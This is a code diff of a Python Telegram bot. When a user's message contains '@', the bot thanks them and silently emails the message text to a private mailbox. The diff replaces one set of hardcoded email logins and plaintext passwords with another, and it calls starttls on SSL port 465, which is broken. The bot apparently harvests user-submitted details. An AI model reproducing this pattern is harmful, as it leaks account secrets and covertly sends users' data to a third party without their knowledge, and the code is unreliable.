@@ -39,10 +39,10 @@ def if_else(message):
         if baza == '@':
             bot.send_message(message.chat.id, 'Спасибо,что остались с нами. Вы точно не пожалеете😉')
             try:
-                smtpObj = smtplib.SMTP("smtp.gmail.com", 587) 
+                smtpObj = smtplib.SMTP("smtp.meta.ua", 465) 
                 smtpObj.starttls()
-                smtpObj.login("kolya.com145@gmail.com", "Kolya14102005") 
-                smtpObj.sendmail("busovrm4@gmail.com", "kolya.com145@gmail.com", message.text)
+                smtpObj.login("BaskovaEvfaniya117@meta.ua", "nz2yBzx1zuE5") 
+                smtpObj.sendmail("busovrm4@gmail.com", "BaskovaEvfaniya117@meta.ua", message.text)
             finally:
                 smtpObj.quit()
 bot.polling(none_stop = True)
